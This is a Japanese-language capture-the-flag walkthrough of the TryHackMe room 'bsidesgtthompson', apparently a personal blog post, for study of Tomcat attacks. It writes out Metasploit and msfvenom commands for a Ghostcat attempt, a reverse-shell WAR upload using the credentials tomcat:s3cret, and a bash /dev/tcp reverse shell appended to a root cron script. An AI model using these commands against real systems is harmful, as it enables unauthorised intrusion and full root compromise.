---
author: "ijikeman"
showToc: true
TocOpen: true
title: "TryHackMe: bsidesgtthompson Walkthrough"
date: 2026-03-27T00:00:00+09:00
aliases: ["/TryHackMe/bsidesgtthompson"]
tags: ["TryHackMe", "CTF", "walkthrough", "Tomcat", "Ghostcat", "CVE-2020-1938", "WAR", "CronJob"]
categories: ["TryHackMe"]
draft: false
cover:
    image: "/images/eyecatch/TryHackMe/bsidesgtthompson/index.png"
---

# このページでわかること

* TryHackMe ルーム「bsidesgtthompson」のWalkthrough
* Tomcat Manager の 401 エラーページに記載されたデフォルト認証情報の発見
* WAR ファイルアップロードによる RCE（Remote Code Execution）
* Cron Job Hijacking による root 権限昇格
* Ghostcat (CVE-2020-1938) の仕組みと限界

# ルーム情報

| 項目 | 内容 |
|------|------|
| ルーム名 | bsidesgtthompson |
| 難易度 | Easy |
| カテゴリ | Web, Privilege Escalation |
| URL | https://tryhackme.com/room/bsidesgtthompson |

# 執筆時の環境

* OS: Ubuntu (TryHackMe AttackBox)
* ツール: nmap, gobuster, metasploit, msfvenom, netcat

# 参考サイト

* [TryHackMe 公式](https://tryhackme.com/room/bsidesgtthompson)
* [Ghostcat CVE-2020-1938 - Exploit-DB](https://www.exploit-db.com/exploits/48143)
* [GTFOBins](https://gtfobins.github.io/)

---

# 1. ポートスキャン

## 1-1. TCP ポートスキャン

```bash
nmap -sC -sV -T4 <TARGET_IP>
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 8.5.5
```

| ポート | サービス | バージョン |
|--------|---------|-----------|
| 22/tcp | SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 8009/tcp | AJP13 | Apache Jserv Protocol v1.3 |
| 8080/tcp | HTTP | Apache Tomcat 8.5.5 |

注目すべき点が 2 つある。

1. **AJP13 (8009)** が外部に公開されている。Ghostcat (CVE-2020-1938) の対象となりうるポートであり、本来は内部通信専用プロトコルのため外部公開は危険。
2. **Tomcat 8.5.5** は 2020 年に修正された Ghostcat 脆弱性の影響を受けるバージョン（修正版: 8.5.51+）。

---

# 2. 調査

## 2-1. ディレクトリ列挙

```bash
gobuster dir \
  -u http://<TARGET_IP>:8080 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 50
```

```
/docs      (Status: 302)
/examples  (Status: 302)
/manager   (Status: 302)
```

`/manager` が発見された。Tomcat Manager は WAR ファイルのデプロイが可能な管理インターフェースであり、認証情報が取得できれば RCE につながる。

## 2-2. Ghostcat (CVE-2020-1938) の試み

AJP13 が公開されており、Tomcat のバージョンも脆弱な範囲内であるため、Ghostcat を試みた。

### AJP (Apache JServ Protocol) とは

```
[ブラウザ] --HTTP--> [Apache httpd] --AJP--> [Tomcat]
```

AJP は Web サーバー（Apache httpd など）と Java アプリケーションサーバー（Tomcat）の間で使用される内部通信プロトコル。設定ミスにより `0.0.0.0` にバインドされると外部から直接アクセス可能になり、Ghostcat のような脆弱性が悪用されやすくなる。

```bash
# Metasploit で Ghostcat を試行
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS <TARGET_IP>
set RPORT 8009
run
```

**結果**: 攻撃は成功しなかった。カスタムアプリケーションがデプロイされていないため、読み取り可能な有用なファイルが存在しなかった。

Ghostcat は任意のファイル読み取り（LFI）が可能だが、デフォルトの Tomcat のみが稼働している環境では、機密情報を含むファイルが存在しないことが多い。

## 2-3. Tomcat Manager 認証情報の発見

`/manager/html` へアクセスすると 401 Unauthorized が返された。

```bash
curl -i http://<TARGET_IP>:8080/manager/html
```

```
HTTP/1.1 401 Unauthorized
...
```

通常、401 エラーページには Tomcat のデフォルト認証情報のサンプルが記載されている。ブラウザでアクセスしてページの内容を確認したところ、以下のヒントが記載されていた。

```
username="tomcat" password="s3cret"
```

取得した認証情報でログインを試みる。

```bash
curl -u "tomcat:s3cret" http://<TARGET_IP>:8080/manager/html
# -> 200 OK ログイン成功
```

* 取得した認証情報: `tomcat:s3cret`

なお、Metasploit の `tomcat_mgr_login` モジュールでブルートフォースを試みたが、`s3cret` はデフォルトのワードリストに含まれていなかったためヒットしなかった。401 ページを手動で確認することで発見できた。

---

# 3. 攻撃 (Exploitation)

## 3-1. WAR ファイルとは

WAR (Web Application Archive) は Java Web アプリケーションのパッケージ形式。Tomcat Manager から `.war` ファイルをデプロイするとアプリケーションが即座に起動・実行される。悪意のあるコード（リバースシェル）を仕込んだ WAR をアップロードすることで RCE が成立する。

## 3-2. 方法1: msfvenom で手動生成

```bash
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=<自分のIP> \
  LPORT=4444 \
  -f war \
  -o shell.war
```

生成した `shell.war` を Tomcat Manager の GUI（`/manager/html`）からアップロード後、`http://<TARGET_IP>:8080/shell/` にアクセスするとリバースシェルが起動する。

## 3-3. 方法2: Metasploit モジュールで自動化（推奨）

```bash
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS <TARGET_IP>
set RPORT 8080
set HttpUsername tomcat
set HttpPassword s3cret
set LHOST <自分のIP>
set LPORT 4444
set PAYLOAD java/shell_reverse_tcp
run
```

```
[*] Started reverse TCP handler on <自分のIP>:4444
[*] Uploading 6459 bytes as abc123.war ...
[*] Executing /abc123/...
[*] Command shell session 1 opened
```

シェルを取得後、ユーザを確認する。

```bash
id
# uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

`tomcat` ユーザでシェルを取得できた。

## 3-4. user.txt の取得

```bash
cat /home/jack/user.txt
```

`/home/jack/user.txt` からユーザーフラグを取得した。

---

# 4. 権限昇格 (Privilege Escalation)

## 4-1. Cron Job の調査

```bash
cat /etc/crontab
```

```
# /etc/crontab: system-wide crontab
...
*  *  *  *  *  root  cd /home/jack && bash id.sh
```

root 権限で毎分 `/home/jack/id.sh` が実行されていることがわかった。

## 4-2. id.sh のパーミッション確認

```bash
ls -la /home/jack/id.sh
```

```
-rwxrwxrwx 1 jack jack 26 Aug 14 2019 id.sh
```

**全ユーザが書き込み可能（777）** になっている。これは Cron Job Hijacking の典型的な脆弱点。

## 4-3. リバースシェルの追記

攻撃クライアント側でリスナーを準備する。

```bash
# Metasploit でリスナーを起動
use exploit/multi/handler
set PAYLOAD cmd/unix/reverse_bash
set LHOST <自分のIP>
set LPORT 4451
run
```

`tomcat` ユーザのシェルから `id.sh` にリバースシェルを追記する。

```bash
echo 'bash -i >& /dev/tcp/<自分のIP>/4451 0>&1' >> /home/jack/id.sh
```

1 分以内に cron が `id.sh` を root 権限で実行し、リバースシェルが接続される。

```
[*] Command shell session 2 opened
id
uid=0(root) gid=0(root) groups=0(root)
```

root 権限のシェルを取得できた。

## 4-4. root.txt の取得

```bash
cat /root/root.txt
```

`/root/root.txt` からルートフラグを取得した。

---

# 5. フラグ取得

| フラグ | 取得方法 |
|--------|----------|
| user.txt | `tomcat` ユーザのシェルから `/home/jack/user.txt` を読み取り |
| root.txt | Cron Job Hijacking 後に root シェルで `/root/root.txt` を読み取り |

---

# まとめ

## 攻略フロー

```
Nmap
  → ポート 22(SSH), 8009(AJP13), 8080(Tomcat 8.5.5) 発見
  → Gobuster で /manager 発見
  → Ghostcat (CVE-2020-1938) 試みるも失敗（カスタムアプリ未デプロイ）
  → 401 ページのヒントから tomcat:s3cret を発見
  → Tomcat Manager WAR Upload → RCE → tomcat ユーザシェル取得
  → user.txt 取得
  → /etc/crontab で root 実行の id.sh 発見（777 パーミッション）
  → Cron Job Hijacking → root シェル取得
  → root.txt 取得
```

## 習得スキル

* **AJP13 の危険性**: AJP は内部通信専用プロトコルであり、外部公開は Ghostcat のような脆弱性悪用につながる
* **Ghostcat (CVE-2020-1938) の限界**: 脆弱なバージョンでも、読み取れる機密ファイルが存在しなければ実害は限定的
* **Tomcat Manager の 401 ページ確認**: エラーページに認証情報のヒントが記載されている場合がある。ブルートフォースだけに頼らず手動確認が有効
* **WAR デプロイによる RCE**: Tomcat Manager へのアクセスは即座に WAR デプロイ → RCE につながる重大なリスク
* **Cron Job Hijacking**: root 権限で実行されるスクリプトのパーミッションが甘い場合、書き込みにより root 権限昇格が可能

## ハマったポイント

* Ghostcat に対応する Tomcat バージョン（8.5.5）だったが攻撃は成功しなかった。カスタムアプリがデプロイされていないと有用なファイルが存在しないため、脆弱なバージョンであっても影響が限定される
* Metasploit の `tomcat_mgr_login` ブルートフォースでは `s3cret` がヒットしなかった。デフォルトワードリストに含まれていないパスワードは手動確認で発見する必要がある
